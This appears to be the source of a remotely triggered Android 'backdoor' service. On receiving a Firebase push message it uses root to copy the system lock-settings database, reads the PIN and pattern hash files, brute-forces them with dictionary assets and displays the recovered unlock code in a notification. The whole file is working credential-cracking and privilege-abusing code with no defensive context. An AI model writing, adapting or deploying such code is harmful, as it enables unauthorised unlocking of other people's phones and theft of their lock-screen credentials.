package com.kweisa.backdoor;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.media.RingtoneManager;
import android.net.Uri;
import android.support.v4.app.NotificationCompat;
import android.util.Log;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Objects;

public class MessagingService extends FirebaseMessagingService {
    private final String TAG = "MessagingService";
    private boolean threadFlag = true;
    private int eofFlag = 0;
    private byte[] pattern;
    private String pin;

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        long start = System.currentTimeMillis();
        try {
            loadDatabase();
            switch (getPasswordType()) {
                case DevicePolicyManager.PASSWORD_QUALITY_ALPHABETIC:
                case DevicePolicyManager.PASSWORD_QUALITY_ALPHANUMERIC:
                case DevicePolicyManager.PASSWORD_QUALITY_COMPLEX:
                    //TODO: PASSWORD BREAK
                    break;
                case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC:
                case DevicePolicyManager.PASSWORD_QUALITY_NUMERIC_COMPLEX:
                    breakPIN();
                    break;
                case DevicePolicyManager.PASSWORD_QUALITY_SOMETHING:
                    breakPatternHash();
                    break;
                case DevicePolicyManager.PASSWORD_QUALITY_UNSPECIFIED:
                case DevicePolicyManager.PASSWORD_QUALITY_BIOMETRIC_WEAK:
                    break;
            }
        } catch (IOException | InterruptedException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        long end = System.currentTimeMillis();
        Log.d(TAG, "TIME : " + (end - start) / 1000.0);
    }

    private int getPasswordType() throws IOException, InterruptedException {
        SQLiteDatabase db = SQLiteDatabase.openDatabase(getDatabasePath("locksettings.db").getPath(), null, SQLiteDatabase.OPEN_READONLY);
        Cursor c = db.rawQuery("select value from locksettings where name='lockscreen.password_type'", null);
        c.moveToFirst();
        int type = c.getInt(0);
        db.close();
        c.close();

        return type;
    }

    private void breakPIN() throws IOException, InterruptedException, NoSuchAlgorithmException {
        String password = getDevicePin();
        Log.d(TAG, "PIN: " + password);
        String salt = getDeviceSalt();
        Log.d(TAG, "Salt: " + salt);

        SharedPreferences sharedPreferences = getSharedPreferences("lock_code", MODE_PRIVATE);
        pin = sharedPreferences.getString(password, null);
        if (pin == null) {
            {
                final int FILE_NUM = 4;
                final String FILE_NAME_PRE = "pin_";
                String[] fileNames = new String[FILE_NUM];

                for (int i = 0; i < FILE_NUM; i++)
                    fileNames[i] = FILE_NAME_PRE + i;

                ArrayList<BufferedReader> bufferedReaders = new ArrayList<>();
                for (String fileName : fileNames) {
                    bufferedReaders.add(new BufferedReader(new InputStreamReader(getAssets().open(fileName))));
                }

                ArrayList<Thread> threads = new ArrayList<>();
                for (int i = 0; i < FILE_NUM; i++) {
                    threads.add(new PinBreakingThread(bufferedReaders.get(i), password, salt, i));
                }

                for (Thread thread : threads) {
                    thread.start();
                }

                while (true) {
                    if (!threadFlag) {
                        Log.d(TAG, pin);
                        sendNotification("PIN", pin);
                        break;
                    } else if (eofFlag == 4)
                        break;
                }
                eofFlag = 0;
            }
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString(password, pin);
            editor.apply();
        } else {
            Log.d(TAG, "Stored " + pin);
            sendNotification("PIN", pin);
        }
    }

    private String getDevicePin() throws IOException, InterruptedException {
        List<String> commands = new ArrayList<>();
        commands.add("cat /data/system/password.key");

        String password;

        Process process = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(process.getOutputStream());
        DataInputStream is = new DataInputStream(process.getInputStream());
        for (String tmpCmd : commands) {
            os.writeBytes(tmpCmd + "\n");
        }

        os.writeBytes("exit\n");
        os.flush();
        os.close();
        password = is.readLine();
        is.close();
        process.waitFor();

        return password;
    }

    private String getDeviceSalt() throws IOException, InterruptedException {
        SQLiteDatabase db = SQLiteDatabase.openDatabase(getDatabasePath("locksettings.db").getPath(), null, SQLiteDatabase.OPEN_READONLY);
        Cursor c = db.rawQuery("select value from locksettings where name='lockscreen.password_salt'", null);
        c.moveToFirst();
        long salt = c.getLong(0);
        db.close();
        c.close();

        return Long.toHexString(salt);
    }

    private void loadDatabase() throws IOException, InterruptedException {
        List<String> commands = new ArrayList<>();
        commands.add("cp /data/system/locksettings.db /data/data/com.kweisa.backdoor/databases/");
        commands.add("cp /data/system/locksettings.db-shm /data/data/com.kweisa.backdoor/databases/");
        commands.add("cp /data/system/locksettings.db-wal /data/data/com.kweisa.backdoor/databases/");
        commands.add("chmod -R 777 /data/data/com.kweisa.backdoor/databases");

        Process process = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(process.getOutputStream());
        for (String tempCommand : commands) {
            os.writeBytes(tempCommand + "\n");
        }

        os.writeBytes("exit\n");
        os.flush();
        os.close();
        process.waitFor();
    }

    private void breakPatternHash() throws IOException, InterruptedException {
        byte[] patternHash = getDevicePatternHash();
        Log.d(TAG, "PATTERN: " + byteArrayToHex(patternHash));

        SharedPreferences sharedPreferences = getSharedPreferences("lock_code", MODE_PRIVATE);
        String storedPattern = sharedPreferences.getString(byteArrayToHex(patternHash), null);

        if (storedPattern == null) {
            {
                final int FILE_NUM = 4;
                final String FILE_NAME_PRE = "pattern_";
                String[] fileNames = new String[FILE_NUM];

                for (int i = 0; i < FILE_NUM; i++)
                    fileNames[i] = FILE_NAME_PRE + i;

                ArrayList<DataInputStream> dataInputStreams = new ArrayList<>();
                for (String fileName : fileNames) {
                    dataInputStreams.add(new DataInputStream(getAssets().open(fileName)));
                }

                ArrayList<Thread> threads = new ArrayList<>();
                for (int i = 0; i < FILE_NUM; i++) {
                    threads.add(new PatternBreakingThread(dataInputStreams.get(i), patternHash, i));
                }

                for (Thread thread : threads) {
                    thread.start();
                }

                while (true) {
                    if (!threadFlag) {
                        Log.d(TAG, byteArrayToPattern(pattern));
                        sendNotification("Pattern", byteArrayToPattern(pattern));
                        break;
                    } else if (eofFlag == 4)
                        break;
                }
                eofFlag = 0;
            }
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString(byteArrayToHex(patternHash), byteArrayToPattern(pattern));
            editor.apply();
        } else {
            Log.d(TAG, "Stored " + storedPattern);
            sendNotification("Pattern", storedPattern);
        }
    }

    private byte[] getDevicePatternHash() throws IOException, InterruptedException {
        List<String> commands = new ArrayList<>();
        commands.add("cat /data/system/gesture.key");
        byte[] hash = new byte[20];

        Process process = Runtime.getRuntime().exec("su");
        DataOutputStream os = new DataOutputStream(process.getOutputStream());
        DataInputStream is = new DataInputStream(process.getInputStream());

        for (String tmpCmd : commands) {
            os.writeBytes(tmpCmd + "\n");
        }

        os.writeBytes("exit\n");
        os.flush();
        os.close();

        is.read(hash);
        is.close();

        process.waitFor();

        return hash;
    }

    private byte[] sha1(byte[] msg) throws NoSuchAlgorithmException {
        return MessageDigest.getInstance("SHA1").digest(msg);
    }

    public String byteArrayToPattern(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for (byte b : a)
            sb.append(String.format("%x->", b & 0xff));
        sb.delete(sb.length() - 2, sb.length());
        return sb.toString();
    }

    public String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for (byte b : a)
            sb.append(String.format("%02x", b & 0xff));
        return sb.toString();
    }

    private void sendNotification(String title, String message) {
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0 /* Request code */, intent,
                PendingIntent.FLAG_ONE_SHOT);

        Uri defaultSoundUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle(title)
                .setContentText(message)
                .setAutoCancel(true)
                .setSound(defaultSoundUri)
                .setContentIntent(pendingIntent);

        NotificationManager notificationManager =
                (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        assert notificationManager != null;
        notificationManager.notify(0 /* ID of notification */, notificationBuilder.build());
    }

    private class PinBreakingThread extends Thread {
        private String TAG = "PinBreakingThread";
        private BufferedReader bufferedReader;
        private String pinHash;
        private String salt;

        PinBreakingThread(BufferedReader bufferedReader, String pinHash, String salt, int n) {
            this.bufferedReader = bufferedReader;
            this.pinHash = pinHash;
            this.salt = salt;
            TAG += n;
        }

        @Override
        public void run() {
            try {
                while (threadFlag) {
                    String readPin = bufferedReader.readLine();
                    byte[] saltedPassword = (readPin + salt).getBytes();
                    byte[] sha1 = MessageDigest.getInstance("SHA-1").digest(saltedPassword);
                    byte[] md5 = MessageDigest.getInstance("MD5").digest(saltedPassword);
                    String candiPinHash = byteArrayToHex(sha1) + byteArrayToHex(md5);

                    if (Objects.equals(pinHash, candiPinHash.toUpperCase())) {
                        Log.d(TAG, readPin + " : " + candiPinHash);
                        pin = readPin;
                        threadFlag = false;
                    }
                }
            } catch (EOFException e) {
                eofFlag++;
                Log.d(TAG, "EOF: " + eofFlag);
            } catch (IOException | NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
        }
    }

    private class PatternBreakingThread extends Thread {
        private String TAG = "PatternBreakingThread";
        private DataInputStream dataInputStream;
        private byte[] patternHash;

        PatternBreakingThread(DataInputStream dataInputStream, byte[] patternHash, int n) {
            this.dataInputStream = dataInputStream;
            this.patternHash = patternHash;
            TAG += n;
        }

        @Override
        public void run() {
            try {
                while (threadFlag) {
                    String readPattern;
                    byte[] temp = new byte[4];

                    dataInputStream.read(temp);
                    readPattern = Integer.toString(ByteBuffer.wrap(temp).getInt());
                    byte[] bytePattern = new byte[readPattern.length()];
                    for (int i = 0; i < readPattern.length(); i++) {
                        bytePattern[i] = (byte) (readPattern.charAt(i) - '1');
                    }
                    sha1(bytePattern);

                    if (Arrays.equals(sha1(bytePattern), patternHash)) {
                        Log.d(TAG, byteArrayToHex(bytePattern) + " : " + byteArrayToHex(sha1(bytePattern)));
                        pattern = bytePattern;
                        threadFlag = false;
                    }
                }
            } catch (EOFException e) {
                eofFlag++;
                Log.d(TAG, "EOF: " + eofFlag);
            } catch (IOException | NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
        }
    }
}
